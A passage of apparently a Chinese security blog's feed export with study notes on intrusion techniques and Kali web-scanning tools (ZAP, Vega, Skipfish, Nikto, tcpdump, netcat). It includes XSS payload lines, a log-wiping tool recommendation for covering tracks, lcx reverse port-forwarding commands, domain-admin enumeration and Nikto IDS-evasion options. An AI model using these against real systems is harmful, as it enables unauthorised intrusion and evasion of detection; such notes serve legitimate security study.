Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
      
      
      <categories>
          
          <category> 读书摘要 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑客攻防web安全实战详解 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</title>
      <link href="/archives/b248361f/"/>
      <url>/archives/b248361f/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-QWASP-ZAP"><a href="#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP"></a>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</h1><p>扫描工具-QWASP_ZAP</p><p>十大安全工具之一，集成性工具，功能完善，而且强大。既可做主动扫描，也可做截断代理。开源免费跨平台，简单易用，体验相对混乱，但在主动扫描方面，相对占优。【kali集成】(主动扫描方面比burp好)</p><pre><code>####建议选择第二项####注意检查更新</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251642_866.jpg" alt=""></p><p>更新与插件安装</p><pre><code>安装插件release和beta【release：成熟版  beta：测试版  alpha：不成熟版】</code></pre><p>截断代理【结合手动爬网】</p><pre><code>默认情况下，代理功能自启动1、启动浏览器代理2、</code></pre><p>2、主动扫描</p><pre><code>一、快速爬网扫描二、直接扫描爬到的内容对于要身份认证才能访问的网页无法进行扫描，需要进行身份认证配置Fuzz二、</code></pre><p>结果分析：</p><pre><code>1、查看Code【200 OK】（）若为302，则是重定向2、查看Size Resp.Header是否不同</code></pre><p>暴力破解：</p><pre><code>API功能【程序接口】~http:/zap/【代理已经指向OWASP_ZAP】</code></pre><p>3、使用方法</p><pre><code>0、Persist Session1.四种模式Mode----safe&lt;protect&lt;standard&lt;ATTACK【小心选择扫描模式】2、升级add-ons3、Scan Profile（扫描策略）    右键-&gt;攻击-&gt;Active Scan    自定义扫描策略4、Anti CSRF Tokens【某些网站为了防止CSRF攻击，每次随机生成Tokens】5、扫描https网站时，出现证书报错，通过导入ssl证书，则不会出现错误6、Scope / Contexts（范围） / filter    #Scope  以相同的策略进行扫描（包含context）    #Contexts7、Http Sessions——default session tokens &amp; site session tokens    Session  Properties  #使用默认Manual已能满足大多数，失效再考虑下面#使用表单进行身份认证#脚本认证Script，需自己编写脚本【有脚本模版】#默认情况下，只认定指定的Session的名，必须手动添加其他Session【如：security】 #显示http Session tab    #用于使用不同用户登录审计，判断是否有越权8、Note / tag【添加各种标签，方便审计】9、Passive scan</code></pre><p>############################################################################################</p><p>#实时截断【注意截断时间，需快速】</p><pre><code>##返回的结果也会拦截</code></pre><p>#显示隐藏域</p><p>###隐藏域在客户端是为了降低客户端对服务端的请求过程，提高速度和用户体验。若服务端没对数据进行检验或检查，可进行价格修改和恶意代码注入等</p><pre><code>#被动扫描规则#爬网域值</code></pre><p>##########################################################################################</p><p>扫描标准流程</p><pre><code>设置代理手动爬网自动爬网     #强制浏览web服务器【有可能发现一些web目录】    #强制目录浏览、强制目录和子目录爬网【有各自的字典】主动扫描【active scan】</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QWASP_ZAP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Vega</title>
      <link href="/archives/136af25a/"/>
      <url>/archives/136af25a/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Vega"><a href="#kali渗透测试之Web渗透-扫描工具-Vega" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Vega"></a>kali渗透测试之Web渗透-扫描工具-Vega</h1><p>##任务6： WEB扫描工具-Vega</p><p> 纯图形化界面，Java编写的开源web扫描器。两种工作模式：扫描模式和代理模式【主流扫描功能】。用于爬站。处理表单，注入测试等。支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="external">http://vega/ca.crt</a></p><p>专注于应用程序代码方面的漏洞</p><p>Vega<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251348_627.jpg" alt=""></p><pre><code>#基于字典发现网站目录</code></pre><p>代理模式</p><p>被动收集信息，结合手动爬站【即页面中能点击的链接全部点击一遍，能提交数据的地方，全部提交一遍】</p><p>连接到网站外面的链接可以暂时不用管<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_64.jpg" alt=""></p><pre><code>#设置外部代理服务器</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_630.jpg" alt=""></p><pre><code>#删除user-agent尾部的vega字样</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_272.jpg" alt=""></p><pre><code>#设置代理</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_285.jpg" alt=""></p><pre><code>1、setup重置【方便用户初始安装和配置】设置安装完成后，一定要删掉，不能留在服务器。如果权限设置不当，通过非授权访问到，可篡改数据库内容</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_130.jpg" alt=""></p><pre><code>2、提交数据【随便输入，目的：被Vega抓取数据】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_567.jpg" alt=""></p><pre><code>3、URL【?参数=***】在等号后面的值，添加不正常的内容，看返回结果4、view source【服务器端源代码，正常Web application中没有此功能，只为了分析漏洞而提供的功能】5、上传位置【同理：成功与否，无所谓】6、反射性XSS【输入什么内容，就返回什么内容】7、论坛或收集反馈的典型表单页面【】8、phpinfo  #安装PHP后，测试是否能否正常工作 【泄漏大量服务器配置信息】#左边灰白色为页面中存在的链接</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_798.jpg" alt=""></p><pre><code>#部分扫描结果</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_220.jpg" alt=""></p><pre><code>9、事后操作-修改内容重放【在时间失效之前】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_991.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_491.jpg" alt=""></p><pre><code>截断功能【代理方面有所欠缺】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_90.jpg" alt=""><br>扫描模式【切换】</p><pre><code>vega主动，对页面中的内容、参数进行扫描</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_475.jpg" alt=""></p><pre><code>配置1、准备     #定义身份认证信息    1、basic http authentication    #http基本身份认证    2、digest http authentication   #http摘要身份认证    3、NTLM                                 #windows系统账号密码认证【未加入域】    4、macro                                 #基于表单【大部分web应用身份认证】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_2.jpg" alt=""></p><pre><code>        #创建宏</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_704.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_133.jpg" alt=""></p><pre><code>2、开始</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_828.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_280.jpg" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_318.jpg" alt=""></p><pre><code>#查看详细信息console</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_31.jpg" alt=""></p><pre><code>#请求内容的过程</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_181.jpg" alt=""></p><p>https证书加密网站【即其既是一个服务网站，又是一个可信证书颁发机构】的扫描【截断代理】</p><pre><code>签名证书：由权威颁发机构颁发给服务器或者个人用于证明自己身份的东西，默认客户端都是信任的。主要目的是用来加密和保证数据的完整性和不可抵赖性自签名证书：由服务器自己颁发给自己，用于证明自己身份的东西，非权威颁发机构发布，默认客户端都是不信任的，主要目的是用来加密和保证数据的完整性和不可抵赖性,与签名证书相同.创建自签名SSL证书：http://www.cnblogs.com/lihuang/articles/4205540.html也是类似，通过vega作为代理服务器，伪造证书，进行信息劫持，进行但要注意：####当访问网站出现信任报错时，可能是有人伪造了证书【如：百度号称全站https，淘宝、阿里、facebook】查看证书</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_9.jpg" alt=""></p><pre><code>#右键 View Page info</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_884.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vega </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Skipfish</title>
      <link href="/archives/497d64c3/"/>
      <url>/archives/497d64c3/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Skipfish"><a href="#kali渗透测试之Web渗透-扫描工具-Skipfish" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Skipfish"></a>kali渗透测试之Web渗透-扫描工具-Skipfish</h1><h2 id="任务8：-skipfish"><a href="#任务8：-skipfish" class="headerlink" title="任务8： skipfish"></a>任务8： skipfish</h2><p>Skipfish是一个命令行模式，以C语言编写的积极的Web应用程序的安全性侦察工具，没有代理模式。 它准备了一个互动为目标的网站的站点地图进行一个递归爬网和基于字典的探头。</p><pre><code>优点：速度比较快【多路单线程，全异步网络I/O，消除内存管理和调度开销，支持启发式自动内容识别】，误报相对低</code></pre><p>使用方式：【<a href="https://my.oschina.net/u/995648/blog/114321】" target="_blank" rel="external">https://my.oschina.net/u/995648/blog/114321】</a></p><pre><code>基本命令使用方式    skipfish -o test http:1.1.1.1   #指定输出目录/路径    #ctrl -c   停止    #空格     显示详细信息</code></pre><p>skipfish -o test http:192.168.57.143/dvwa/<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251434_19.png" alt=""><br>打开根目录下的skipfishtest1/index.html文件即可查看详细信息</p><pre><code>    skipfish -o test @url.txt             #字典文件</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251439_346.png" alt=""><br>        skipfish -o test -S complet.wl -Wa.wl <a href="http://1.1.1.1" target="_blank" rel="external">http://1.1.1.1</a>   #指定集成参数字典，发现隐藏目录</p><pre><code>        #dpkg -L skipfish | grep wl</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251458_169.png" alt=""></p><pre><code>-I （i）：只检查包含‘string’的URL     【适用于大型网站】    skipfish -o test1 -I /dvwa/ http://192.168.57.143/dvwa/-X：不检查包含‘string’的URL   【如：logout】-K：不对指定参数进行fuzz测试-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】-l：每秒最大请求数-m：每IP最大并发连接数【依据带宽】--config：指定配置文件 【将参数命令写入一个配置文件】</code></pre><p>身份认证【在一种方式不成功的情况下，使用其他方式】</p><pre><code>    skipfish -A user:pass -o test http://1.1.1.1    #基本http身份认证    skipfish  -C &quot;PHPSESSID=&quot; -C &quot;security=&quot; -o test http://1.1.1.1   #</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251505_541.png" alt=""><br>       基于cookie</p><pre><code>    Usename / Password                           #直接提交表单        ep：skipfish -o a --auth-form http://192.168.1.109/dvwa/login.php --auth-form-target http://192.168.1.109/dvwa/login.php   --auth-user-filed usename --auth-user admin -auth-pass-filed password -auth-pass password --auth-verify-url http://192.168.1.109/dvwa/index.php -I /dvwa/ http://192.168.1.109/dvwa/</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skipfish </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Nikto</title>
      <link href="/archives/a04b3dd7/"/>
      <url>/archives/a04b3dd7/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Nikto"><a href="#kali渗透测试之Web渗透-扫描工具-Nikto" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Nikto"></a>kali渗透测试之Web渗透-扫描工具-Nikto</h1><h2 id="任务4：实验环境Metasploaitable和侦察HTTRACK"><a href="#任务4：实验环境Metasploaitable和侦察HTTRACK" class="headerlink" title="任务4：实验环境Metasploaitable和侦察HTTRACK"></a>任务4：实验环境Metasploaitable和侦察HTTRACK</h2><p>httrack 克隆一个网站页面到本地<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231143_886.png" alt=""><br>mkdir dvwa 创建一个目录<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231145_468.png" alt=""></p><p>侦察【减少与目标系统交互】</p><pre><code>Httrack：将WEB可下载的页面下载到本机，再进行本地检查【kali下安装】##可到此网站获取代理：hidemyass.com【免费代理需小心】</code></pre><h2 id="任务5：扫描工具-Nikto"><a href="#任务5：扫描工具-Nikto" class="headerlink" title="任务5：扫描工具-Nikto"></a>任务5：扫描工具-Nikto</h2><p>基于WEB的扫描工具，基本都支持两种扫描模式。代理截断模式，<strong>主动扫描模式</strong></p><p>手动扫描：作为用户操作发现页面存在的问题，但可能会存在遗漏</p><p>自动扫描：基于字典，提高速度，但存在误报和触发警告</p><p>参考书：Web_Penetration_Testing_with_Kali_Linux</p><p>Nikto【纯主动型】<br>   Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。<br>扫描内容：</p><pre><code>1、软件版本2、搜索存在安全隐患的文件【如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码】3、服务器配置漏洞【组件可能存在默认配置】    4、WEB Application层面的安全隐患【xss，SQL注入等】    5、避免404误判        ·很多服务器不遵守RFC标准，对于不存在的对象返回200响应码        ·依据响应文件内容判断，不同扩展名【jsp、cji】的文件404响应内容不同        ·去除时间信息后的内容取MD5值        ·参数：-no404【不进行误判尝试判断，可能存在误判】</code></pre><p>命令详解：</p><pre><code>nikto 主要参数man nikto 更多参数nikto -update   #直接更新数据库，厂商网址可能被墙 【在此网站可下载最新版http://cirt.net/nikto/UPDATES/】nikto  -list-plugins       #插件列表</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251346_435.jpg" alt=""></p><pre><code>nikto -host http://1.1.1.1 （目标）nikto -host 192.168.1.1 -ssl -port 443,8443,995 扫描端口例如：nikto -host www.baidu.com -port 443 -sslssl即https的端口默认为443</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041704_648.png" alt=""></p><p>nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="external">http://192.168.1.109/dvwa/</a>           #指定网站目录扫描</p><pre><code>nikto -host 192.168.1.1.109 -port 80,443      #可指定多个端口【加-output：输出结果】nikto -host host.txt   #扫描多个IPnmap -p80 192.168.1.0/24 -oG - | nikto -host -        #结合nmap，对一个网段内开放了80端口的主机进行扫描 nikto -host https://www.baidu.com -useproxy http://localhost:8087     #使用代理-vhost  【+域名】   #虚拟IP，区分网站【使用背景：一个ip对应多个网站】</code></pre><p>交互性参数【用于扫描过程中】</p><pre><code>回车：报告当前状态v：正在扫描的详细信息（路径，结果等）#再按v就停止d：极其详细的信息，包括传strong text输内容     #e：错误信息                                    #p：显示进度                               #r：重定向                                   #c：cookiea：身份认证q：退出N：下一个主机（用于多个IP）P：暂停</code></pre><p>nikto配置文件【大部分需要登录进网站，才能进行扫描】</p><pre><code>    -id+    #使用http身份认证【但现在很少】支持指定cookie    vi /etv/nikto.conf</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251338_899.jpg" alt=""></p><pre><code>    #修改useagent【默认配置，容易被管理员发现】    USERAGENT=Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_604.jpg" alt=""></p><pre><code>    #抓包分析，获取cookie</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_197.jpg" alt=""></p><pre><code>    #修改cookie信息【让nikto获得身份认证，进行进一步扫描】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_949.jpg" alt=""></p><pre><code>    -evasion：使用LibWhisker中对IDS的逃避技术，可使用以下几种类型    1、随机URL编码（非UTF-8方式）    2、自选路径（/./）    3、过早结束的URL    4、优先考虑长随机字符串    5、参数欺骗    6、使用TAB作为命令的分隔符    7、使用变化的URL    8、使用windows路径分隔符”\“</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_7.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nikto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-工具-TCPDUMP</title>
      <link href="/archives/2b646ba1/"/>
      <url>/archives/2b646ba1/</url>
      
        <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-TCPDUMP</p><h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p><p>  No-GUI的抓包分析工具</p><p>  Linux、Unix系统默认安装</p><h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p><p>  默认只抓68个字节</p><p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p><p>  tcpdump -i eth0 port 22</p><p>读取抓包文件</p><p>  Tcpdump -r file.pcap</p><h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p><p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p><p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p><p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p><p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p><p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p><p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p><p>-e 在输出行打印出数据链路层的头部信息。 </p><p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p><p>-f 将外部的Internet地址以数字的形式打印出来。 </p><p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p><p>-i 指定监听的网络接口。 </p><p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p><p>-L 列出网络接口的已知数据链路。 </p><p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p><p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p><p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p><p>-n 不把网络地址转换成名字。</p><p>-nn 不进行端口名称的转换。</p><p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p><p>-t 在输出的每一行不打印时间戳。 </p><p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p><p>-P 不将网络接口设置成混杂模式。 </p><p>-q 快速输出。只输出较少的协议信息。 </p><p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p><p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p><p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p><p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p><p>-t 不在每一行中输出时间戳。 </p><p>-tt 在每一行中输出非格式化的时间戳。 </p><p>-ttt 输出本行和前面一行之间的时间差。 </p><p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p><p>-u 输出未解码的NFS句柄。 </p><p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p><p>-vv 输出详细的报文信息。 </p><p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p><p>root:～# tcpdump -h          </p><pre><code> enter code heretcpdump version 4.3.0libpcap version 1.3.0Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ][ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]             [ -i interface ] [ -j tstamptype ] [ -M secret ]             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]             [ -W filecount ] [ -y datalinktype] [ -z command ]             [ -Z user ] [ expression ]</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p><p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p><p>^C15 packets captured</p><p>15 packets receiced by filter</p><p>0 packets drodded by kernel</p><p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p><p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -i eth0 tcp port 22</p><p>TCPDUMP——筛选</p><p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>  tcpdump -n src host 145.254.160.237 -r http.cap</p><p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>  tcpdump -n port 53 -r http.cap</p><p>  tcpdump -nX port 80 -r http.cap</p><p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>reading from file http.cap, link type En10MB(Ethernet)</p><p>145.253.2.203.53</p><p>145.254.160.237.3009</p><p>145.254.160.237.3371</p><p>145.254.160.237.3372</p><p>216.239.59.99.80</p><p>65.208.228.223.80</p><p>0                  1                    2                   3</p><p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|          Source Port          |     Destination Port          |       </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                        Sequence Number                        |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Acknowledgment Nuber                     |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p><p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p><p>|        |      |R|E|G|K|H|T|N|N|                               |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|            Checksum           |     Urgent Pointer            |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Options               |     Padding      |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                                data                           |          </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>CEUAPRSF</p><p>00011000 = 24 in decimal</p><p>TCPDUMP——高级筛选</p><p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>过程文档记录</p><p>  Dradis</p><pre><code>短期临时小团队资源共享各种插件导入文件</code></pre><p>  keepnote</p><p>  Truecrypt</p><p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p><p>应用程序—–&gt;Office—–&gt;KeepNote</p><p>New Notebook</p><p>新建一个keepnote</p><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCPDUMP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-工具-NETCAT</title>
      <link href="/archives/32be69d6/"/>
      <url>/archives/32be69d6/</url>
      
        <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-NETCAT</p><p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p><h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p><p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p><p>root:~# ping smtp.163.com</p><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6fanghong.yuan@163.com535 Error: authentication failed</code></pre><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 